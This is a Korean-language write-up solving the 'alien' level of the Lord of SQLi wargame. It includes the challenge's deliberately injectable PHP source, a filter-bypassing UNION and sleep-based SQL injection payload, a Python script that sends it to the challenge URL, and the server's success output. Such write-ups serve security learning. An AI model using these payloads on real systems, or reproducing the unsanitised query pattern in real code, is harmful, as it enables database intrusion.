# alien

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
  $query = "select id from prob_alien where no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
  if($_GET['no']){
    $r = mysqli_fetch_array(mysqli_query($db,$query));
    if($r['id'] !== "admin") exit("sandbox1");
    $r = mysqli_fetch_array(mysqli_query($db,$query));
    if($r['id'] === "admin") exit("sandbox2");
    $r = mysqli_fetch_array(mysqli_query($db,$query2));
    if($r['id'] === "admin") exit("sandbox");
    $r = mysqli_fetch_array(mysqli_query($db,$query2));
    if($r['id'] === "admin") solve("alien");
  }
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `admin and or if coalesce case _ . prob time`을 필터링 한다.   
- GET 파라미터 `no`를 받고, small qoutes차이가 있는 두 가지의 쿼리를 생성한다.   
- 쿼리를 총 4번 실행시킨다. 아래는 각 단계별 통과조건이다.   
    1. 결과값이 'admin'이어야 한다.   
    2. 결과값이 'admin'이 아니어야 한다.   
    3. 결과값이 'admin'이 아니어야 한다.   
    4. 결과값이 'admin'이어야 한다.   


## 3. Solution   

크게 두 가지의 기술만 안다면 쉽게 해결 할 수 있다.   
이말은 즉, 위 4가지 단계를 크게 두 가지 조건으로 나눌 수 있다는 뜻이다.   

단계 | 결과값 | 작은 따옴표
---|---|---
1 | `admin` | X
2 | not`admin` | X
3 | not`admin` | O
4 | `admin` | O




#### 결과를 구분한 방법   

`sleep`, `concat`, `second` 그리고 `now`함수를 이용하였다.   
쿼리속에 `sleep`함수를 넣어놓는다면, 단계별로 실행되는 시간에 delay가 발생할 것이고, 이를 이용하였다.    

구체적인 쿼리문과 원리는 다음과 같다.   
```sql
1 union select concat(char(((777-second(now())) div 3) + 65 - sleep(3)),"dmin")
```

1. 파이썬 스크립트를 이용하여, 현재 초(second)와 97('a'의 ascii값)을 더한값을 위 쿼리 속 `777`부분에 입력한다.   
2. sql 쿼리가 실행되면, 위 연산값과 현재 초(second(now()))를 빼며 97을 유도한다.   
3. char 함수 속 `div 3`와 `+ 65`는 오차범위를 주기 위해 추가한 부분이다.   
4. sleep(3)을 거치며 3초의 지연시간을 준다.   
5. 결과적으로 concat함수에 의해 문자열 admin이 완성된다.   
&rarr; 다음 쿼리에서는 3초만큼의 시간이 흐른 후 실행되기에, 1번의 값과 second(now())연산 시 97이 나오지 않는다.   



#### 작은 따옴표 구분한 방법

주석 `#`을 이용하여 구분하였다.   

쿼리와 함께 살펴보자.   
```sql
1 union select concat(char(((777-second(now())) div 3) + 65 - sleep(3)),"dmin")#' union select concat(char(((777-second(now())) div 3) + 65 - sleep(3)),"dmin")#
```

만일 query1 처럼 single qoute가 없다면, 위 쿼리속 첫 `#`에 의해 뒤부분이 주석처리 될 것이다.   
만일 query2 처럼 single qoute가 있다면, 첫 `#`는 문자처리가 되고, 그부분까지의 값이 no값으로 들어갈 것이다. 그렇게 되면 뒷 부분이 실행 되는 것이다.   




위 두 방법을 이용하여 최종 python script를 짜보았다.   
```python
import requests
import time

cookie = {'PHPSESSID' : '~~~~'}

url = "https://los.rubiya.kr/chall/alien_91104597bf79b4d893425b65c166d484.php?no=1 union select concat(char(((%d-second(now())) div 3) %%2b 65 - sleep(3)),\"dmin\")%%23' union select concat(char(((%d-second(now())) div 3) %%2b 65 - sleep(3)),\"dmin\")%%23" % (97+(time.localtime(time.time()).tm_sec), 97+9+(time.localtime(time.time()).tm_sec))
res = requests.get(url, cookies=cookie)
print(res.text.split('<span style="color: #0000BB">&lt;?php')[0])
```
추가적으로, 마지막 query2의 결과가 'admin'이어야 하므로, 97에 3초 delay를 3번 지난, 9초를 더해 106을 넣어주었다.   


실행 결과는 다음과 같다.   
```
<hr>query : <strong>select id from prob_alien where no=1 union select concat(char(((128-second(now())) div 3) + 65 - sleep(3)),"dmin")#' union select concat(char(((137-second(now())) div 3) + 65 - sleep(3)),"dmin")#
</strong><hr><br><hr>query2 : <strong>select id from prob_alien where no='1 union select concat(char(((128-second(now())) div 3) + 65 - sleep(3)),"dmin")#' union select concat(char(((137-second(now())) div 3) + 65 -
 sleep(3)),"dmin")#'</strong><hr><br><h2>ALIEN Clear!</h2><img src="https://www.wechall.net/remoteupdate.php?sitename=LordofSQLi&username=ch4n&img=1" alt="http://www.wechall.net" border=0 height=0 /><br><code><span
style="color: #000000">
```

성공적으로 문제가 해결되었다.   